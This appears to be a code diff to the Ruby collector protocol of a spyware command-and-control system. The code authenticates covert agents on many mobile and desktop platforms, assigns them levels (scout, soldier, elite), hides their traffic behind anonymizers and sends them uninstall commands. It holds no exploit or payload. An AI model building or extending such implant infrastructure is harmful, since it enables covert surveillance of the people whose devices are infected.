@@ -3,9 +3,9 @@
 #
 
 # relatives
-require_relative 'sessions.rb'
-require_relative 'db.rb'
-require_relative 'commands.rb'
+require_relative 'sessions'
+require_relative 'db'
+require_relative 'sync_commands'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -26,7 +26,7 @@ class Protocol
   extend RCS::Crypt
   extend RCS::Collector::Commands
 
-  MIN_ANON_VERSION = '2013031101'
+  MIN_ANON_VERSION = '2014022401'
   PLATFORMS = ["WINDOWS", "WINMO", "OSX", "IOS", "BLACKBERRY", "SYMBIAN", "ANDROID", "LINUX", "WINPHONE"]
 
   def self.authenticate(peer, uri, content, anon_version)
@@ -125,7 +125,7 @@ class Protocol
     platform.delete!("\x00")
     demo = platform.end_with? '-DEMO'
     platform.gsub!(/-DEMO/, '')
-    scout = false
+    level = :elite
 
     # random key part chosen by the server
     ks = SecureRandom.random_bytes(16)
@@ -136,12 +136,23 @@ class Protocol
     k = Digest::SHA1.digest(conf_key + ks + kd)
     trace :debug, "[#{peer}] Auth -- K: " << k.unpack('H*').to_s
 
+    # don't allow direct sync on collector
+    if anon_version == 0
+      trace :warn, "[#{peer}] Agent trying to sync directly on the collector, closing..."
+      return
+    end
+
     # prepare the response:
     # Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response )
     message = aes_encrypt(ks, DB.instance.agent_signature)
 
     # ask the database the status of the agent
-    status, aid, good = DB.instance.agent_status(build_id_real, instance_id, platform, demo, scout)
+    status, aid, good = DB.instance.agent_status(build_id_real, instance_id, platform, demo, level)
+
+    # if the agent was completely removed from the db we don't have the good flag anymore
+    # and the rest call defaults to "bad", but if it's trying to sync on a good anon we
+    # should correctly override it to be able to send the uninstall command
+    good = DBCache.factory_keys[build_id_real]['good'] if status.eql? DB::NO_SUCH_AGENT
 
     # here we have to deny the sync in case the agent and the anon are different:
     # good and good -> ok
@@ -159,7 +170,7 @@ class Protocol
       when DB::DELETED_AGENT, DB::NO_SUCH_AGENT, DB::CLOSED_AGENT
         response = [Commands::PROTO_UNINSTALL].pack('I')
         trace :info, "[#{peer}] Uninstall command sent (#{status})"
-        DB.instance.agent_uninstall(aid)
+        DB.instance.agent_uninstall(aid) unless aid.eql? 0
       when DB::QUEUED_AGENT
         response = [Commands::PROTO_NO].pack('I')
         trace :warn, "[#{peer}] was queued for license limit exceeded"
@@ -168,7 +179,7 @@ class Protocol
         response = [Commands::PROTO_OK].pack('I')
 
         # create a valid cookie session
-        cookie = SessionManager.instance.create(aid, build_id_real, instance_id, platform, demo, scout, k, peer)
+        cookie = SessionManager.instance.create(aid, build_id_real, instance_id, platform, demo, level, k, peer)
 
         trace :info, "[#{peer}] Authentication phase 2 completed [#{cookie}]"
     end
@@ -263,9 +274,14 @@ class Protocol
     demo = (demo.first == 1) ? true : false
     trace :debug, "[#{peer}] Auth -- demo: " << demo.to_s
 
-    scout = message.slice!(0).unpack('C')
-    scout = (scout.first == 1) ? true : false
-    trace :debug, "[#{peer}] Auth -- scout: " << scout.to_s
+    level = message.slice!(0).unpack('C')
+    case level.first
+      when 1
+        level = :scout
+      when 2
+        level = :soldier
+    end
+    trace :debug, "[#{peer}] Auth -- level: #{level}"
 
     flags = message.slice!(0).unpack('C')
     trace :debug, "[#{peer}] Auth -- flags: " << flags.to_s
@@ -279,8 +295,19 @@ class Protocol
     k = Digest::SHA1.digest(conf_key + ks + kd)
     trace :debug, "[#{peer}] Auth -- K: " << k.unpack('H*').to_s
 
+    # don't allow direct sync on collector
+    if anon_version == 0
+      trace :warn, "[#{peer}] Agent trying to sync directly on the collector, closing..."
+      return
+    end
+
     # ask the database the status of the agent
-    status, bid, good = DB.instance.agent_status(build_id_real, instance_id, platform, demo, scout)
+    status, aid, good = DB.instance.agent_status(build_id_real, instance_id, platform, demo, level)
+
+    # if the agent was completely removed from the db we don't have the good flag anymore
+    # and the rest call defaults to "bad", but if it's trying to sync on a good anon we
+    # should correctly override it to be able to send the uninstall command
+    good = DBCache.factory_keys[build_id_real]['good'] if status.eql? DB::NO_SUCH_AGENT
 
     # here we have to deny the sync in case the agent and the anon are different:
     # good and good -> ok
@@ -302,7 +329,7 @@ class Protocol
       when DB::DELETED_AGENT, DB::NO_SUCH_AGENT, DB::CLOSED_AGENT
         response = [Commands::PROTO_UNINSTALL].pack('I')
         trace :info, "[#{peer}] Uninstall command sent (#{status})"
-        DB.instance.agent_uninstall(bid)
+        DB.instance.agent_uninstall(aid) unless aid.eql? 0
       when DB::QUEUED_AGENT
         response = [Commands::PROTO_NO].pack('I')
         trace :warn, "[#{peer}] was queued for license limit exceeded"
@@ -311,7 +338,7 @@ class Protocol
         response = [Commands::PROTO_OK].pack('I')
 
         # create a valid cookie session
-        cookie = SessionManager.instance.create(bid, build_id_real, instance_id, platform, demo, scout, k, peer)
+        cookie = SessionManager.instance.create(aid, build_id_real, instance_id, platform, demo, level, k, peer)
 
         trace :info, "[#{peer}] Authentication phase 2 completed [#{cookie}]"
     end
